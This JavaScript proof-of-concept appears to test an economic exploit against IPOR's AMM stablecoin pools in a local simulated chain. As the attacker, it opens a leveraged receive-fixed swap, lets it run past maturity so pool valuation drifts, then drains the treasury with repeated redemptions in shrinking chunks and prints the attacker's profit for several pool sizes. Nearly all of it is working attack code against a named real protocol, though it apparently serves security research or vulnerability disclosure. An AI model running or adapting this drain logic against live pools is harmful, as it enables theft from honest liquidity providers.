// Realistic-scale sizing: IPOR's AMM pools are small (DefiLlama: "IPOR Derivatives" ~$1.6-2M across all
// chains/assets), so the question is what an attacker can actually take out of one stablecoin pool.
const { main, RISK_BASE, signRisk, E18, PAD } = require('./poc');

const INDEX = 5n * 10n ** 16n;
const f = (x) => (Number(x) / 1e6).toLocaleString('en-US', { maximumFractionDigits: 0 });

async function run({ honestUsdc, atkUsdc, collateralUsdc, leverage, days = 90, direction = 1n, feeRate = 5n * 10n ** 14n, extraDays = 0 }) {
    const tenor = { 28: 0n, 60: 1n, 90: 2n }[days];
    const c = await main({ openingFeeRate: feeRate });
    const { P, usdc, ipToken, oracle, ammStorage, provider, atk, lp, msgSignerWallet, pools, openViaRouter } = c;
    const atkAddr = await atk.getAddress(), lpAddr = await lp.getAddress();
    await c.give(lp, PAD(honestUsdc));
    await c.give(atk, PAD(atkUsdc) + PAD(300_000));
    await (await pools.connect(lp).provideLiquidityUsdc(lpAddr, PAD(honestUsdc), { gasLimit: 5e6 })).wait();
    if (atkUsdc) await (await pools.connect(atk).provideLiquidityUsdc(atkAddr, PAD(atkUsdc), { gasLimit: 5e6 })).wait();
    await (await oracle.updateIndexes([{ asset: P.usdc, indexValue: INDEX, updateTimestamp: 0n, quasiIbtPrice: 0n }])).wait();

    const k = (leverage * feeRate * BigInt(days)) / (365n * E18);
    const totalUsdc = ((PAD(collateralUsdc) * 10n ** 12n * (E18 + k)) / E18 + 35n * E18) * 10n ** 6n / E18 + 2n;
    await c.give(atk, totalUsdc);
    const now = BigInt((await provider.getBlock('latest')).timestamp);
    const ins = { ...RISK_BASE, expiration: now + 3600n };
    const fn = direction === 1n ? `openSwapReceiveFixed${days}daysUsdc` : `openSwapPayFixed${days}daysUsdc`;
    const acceptable = direction === 1n ? 0n : 10n ** 18n;
    await (await openViaRouter.connect(atk)[fn](atkAddr, totalUsdc, acceptable, leverage,
        { ...ins, signature: signRisk(msgSignerWallet, ins, P.usdc, tenor, direction) }, { gasLimit: 9e6 })).wait();

    const swap = await ammStorage.getSwap(Number(direction), 1);
    await provider.send('evm_increaseTime', [days * 86400 + 60]); await provider.send('evm_mine', []);
    if (extraDays) {
        // the 90-day swap matures, but nobody forces it closed: the hypothetical SOAP keeps compounding
        await provider.send('evm_increaseTime', [extraDays * 86400]); await provider.send('evm_mine', []);
    }

    const cashBefore = await usdc.balanceOf(P.treasury);
    // the attacker sweeps as much of the treasury as the guards allow: redeem the largest feasible chunk,
    // then repeat with what is left (a real attacker would not stop at the first revert)
    let got = 0n;
    let remaining = await ipToken.balanceOf(atkAddr);
    for (let round = 0; round < 8 && remaining > 0n; round++) {
        let progressed = false;
        for (const pct of [100n, 90n, 80n, 70n, 60n, 50n, 40n, 30n, 20n, 10n, 5n, 2n, 1n]) {
            const chunk = (remaining * pct) / 100n;
            if (chunk === 0n) continue;
            const before = await usdc.balanceOf(atkAddr);
            try {
                await (await pools.connect(atk).redeemFromAmmPoolUsdc(atkAddr, chunk, { gasLimit: 9e6 })).wait();
                got += (await usdc.balanceOf(atkAddr)) - before;
                remaining -= chunk;
                progressed = true;
                break;
            } catch (e) { }
        }
        if (!progressed) break;
    }
    const cashAfter = await usdc.balanceOf(P.treasury);
    const profit = got - PAD(atkUsdc) - totalUsdc;
    return { swap, got, cashBefore, cashAfter, profit, totalUsdc };
}

(async () => {
    const cases = [
        { label: 'honest 500k, atk 500k | redeem at 90d (on maturity)   ', honestUsdc: 500_000, atkUsdc: 500_000, collateralUsdc: 74_000, leverage: 1000n * E18 },
        { label: 'honest 500k, atk 500k | redeem 90d + 90d  = 180d open ', honestUsdc: 500_000, atkUsdc: 500_000, collateralUsdc: 74_000, leverage: 1000n * E18, extraDays: 90 },
        { label: 'honest 500k, atk 500k | redeem 90d + 275d = 365d open', honestUsdc: 500_000, atkUsdc: 500_000, collateralUsdc: 74_000, leverage: 1000n * E18, extraDays: 275 },
        { label: 'honest 500k, atk 500k | redeem 90d + 640d = 730d open', honestUsdc: 500_000, atkUsdc: 500_000, collateralUsdc: 74_000, leverage: 1000n * E18, extraDays: 640 },
        { label: 'thin 200k,  atk  50k | redeem 90d + 90d  = 180d open ', honestUsdc: 200_000, atkUsdc: 50_000, collateralUsdc: 74_000, leverage: 1000n * E18, extraDays: 90 },
    ];
    for (const cs of cases) {
        try {
            const r = await run(cs);
            console.log(`${cs.label.padEnd(52)} notional=${f(BigInt(r.swap.notional)).padStart(10)} fixed=${(Number(BigInt(r.swap.fixedInterestRate)) / 1e16).toFixed(3).padStart(6)}% atk_spend=${f(PAD(cs.atkUsdc) + r.totalUsdc).padStart(9)} atk_out=${f(r.got).padStart(9)} ATK_NET=${(r.profit > 0n ? '+' : '-') + f(r.profit < 0n ? -r.profit : r.profit).padStart(8)} pool_cash_before=${f(r.cashBefore)} after=${f(r.cashAfter)}`);
        } catch (e) {
            console.log(`${cs.label.padEnd(52)} FAILED: ${(e.stack||"").split("\n").slice(0,6).join(" | ")}`);
        }
    }
})().catch((e) => console.error('FAIL', e.shortMessage || e.message));
